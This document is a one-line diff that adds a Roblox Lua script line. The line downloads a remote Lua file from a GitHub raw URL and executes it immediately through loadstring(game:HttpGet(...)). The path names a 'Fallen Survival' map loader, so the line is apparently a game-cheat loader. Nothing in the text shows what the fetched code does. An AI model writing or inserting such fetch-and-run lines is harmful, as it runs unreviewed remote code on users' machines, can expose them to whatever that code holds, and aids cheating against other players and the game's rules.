@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/new-map-fallen-survival-spam0-js1z6a7hhiiqg5.lua"))()
